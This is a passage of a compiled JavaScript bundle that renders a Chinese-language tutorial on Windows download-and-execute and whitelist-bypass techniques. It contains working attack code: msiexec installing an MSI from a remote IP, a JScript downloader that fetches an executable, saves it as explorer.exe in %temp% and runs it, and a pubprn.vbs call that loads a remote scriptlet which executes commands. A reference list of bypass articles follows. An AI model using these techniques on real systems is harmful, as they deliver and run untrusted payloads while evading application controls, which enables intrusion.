calc.msi\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u547d\u4ee4\u884c\u8fd0\u884c\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"msiexec /quiet /i calc.msi\nmsiexec /q /i http://192.168.28.128/calc.msi\n"})}),"\n",(0,l.jsx)(n.h3,{id:"js\u4e0b\u8f7d\u8005",children:"JS\u4e0b\u8f7d\u8005"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:"cscript test.js\n# \u5982\u679c\u4e0b\u8f7d\u7684\u6587\u4ef6\u4e0d\u80fd\u6267\u884c\uff0c\u90a3\u4e48\u5c06\u63d0\u793a\u201cmsxml3.all \u62d2\u7edd\u8bbf\u95ee\u201d\n"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"test.js"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-javascript",children:'var WSHShell = new ActiveXObject("WScript.Shell");\npath = WSHShell.ExpandEnvironmentStrings("%temp%");\nvar filepath = path+"/explorer.exe";\nvar xhr = new ActiveXObject("MSXML2.XMLHTTP");\nxhr.open("GET","http://192.168.0.101:8001/reshacker_setup.exe", false);\nxhr.send();\nif (xhr.Status == 200) {\n    var fso = new ActiveXObject("Scripting.FileSystemObject");\n    var stream = new ActiveXObject("ADODB.Stream");\n    stream.Open();\n    stream.Type = 1;\n    stream.Write(xhr.ResponseBody);\n    stream.Position = 0;\n    if (fso.FileExists(filepath)){\n       fso.DeleteFile(filepath);\n    }\n    stream.SaveToFile(filepath);\n    stream.Close();\n    new ActiveXObject("WScript.Shell").Exec(filepath);\n}\n'})}),"\n",(0,l.jsx)(n.h3,{id:"pubprnvbs",children:"pubprn.vbs"}),"\n",(0,l.jsxs)(n.p,{children:["\u5728Windows 7\u4ee5\u4e0a\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u540d\u4e3aPubPrn.vbs\u7684\u5fae\u8f6f\u5df2\u7b7e\u540dWSH\u811a\u672c\uff0c\u5176\u4f4d\u4e8e",(0,l.jsx)(n.code,{children:"C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US"}),"\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8be5\u811a\u672c\u53ef\u4ee5\u53d1\u73b0\u5176\u663e\u7136\u662f\u7531\u7528\u6237\u63d0\u4f9b\u8f93\u5165\uff08\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\uff09\uff0c\u4e4b\u540e\u518d\u5c06\u53c2\u6570\u4f20\u9012\u7ed9",(0,l.jsx)(n.code,{children:"GetObject()"})]}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-powershell",children:'"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs" 127.0.0.1 script:\nhttps://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/\na006a47e4075785016a62f7e5170ef36f5247cdb/test.sct\n'})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.strong,{children:"test.sct"})}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-xml",children:'<?XML version="1.0"?>\n<scriptlet>\n<registration\n    description="Bandit"\n    progid="Bandit"\n    version="1.00"\n    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"\n    remotable="true"\n    >\n</registration>\n<script language="JScript">\n<![CDATA[\n        var r = new ActiveXObject("WScript.Shell").Run("calc.exe");\n]]>\n<\/script>\n</scriptlet>\n'})}),"\n",(0,l.jsx)(n.h2,{id:"\u53c2\u8003",children:"\u53c2\u8003"}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://evi1cg.me/archives/AppLocker_Bypass_MSXSL.html",children:"Bypass AppLocker With MSXSL.EXE"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"http://payloads.online/archivers/2017-11-08/1",children:"Windows\u4e0b\u547d\u4ee4\u884c\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://evi1cg.me/archives/Bypassing_Applocker_with_msiexec.html",children:"Bypassing Applocker with msiexec"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://evi1cg.me/archives/Exec_Commands_Via_Mshta.html",children:"Exec Commands Via Mshta.exe"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://evi1cg.me/archives/Run_JSRAT.html",children:"JSRAT\u51e0\u79cd\u542f\u52a8\u65b9\u5f0f"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"http://www.sohu.com/a/199732200_99907709",children:"windows\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0d\u4f1a\u73a9\uff1f \u770b\u6211\uff01"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"http://www.freebuf.com/articles/system/143957.html",children:"WSH\u6ce8\u5165\u6280\u5de7\u5206\u4eab"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/",children:"Application Whitelist Bypass using IEexec.exe"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://www.cnblogs.com/xiaozi/p/12721960.html",children:"Windows\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u768415\u79cd\u59ff\u52bf"})}),"\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://blog.netspi.com/15-ways-to-download-a-file/#netcat",children:"\u6587\u4ef6\u4e0b\u8f7d\u768415\u79cd\u65b9\u5f0f"})})]})}function p(e={}){const{wrapper:n}={...(0,c.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(d,{...e})}):d(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>i});var t=s(96540);const l={},c=t.createContext(l);function r(e){const n=t.useContext(c);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:r(e.components),t.createElement(c.Provider,{value:n},e.children)}}}]);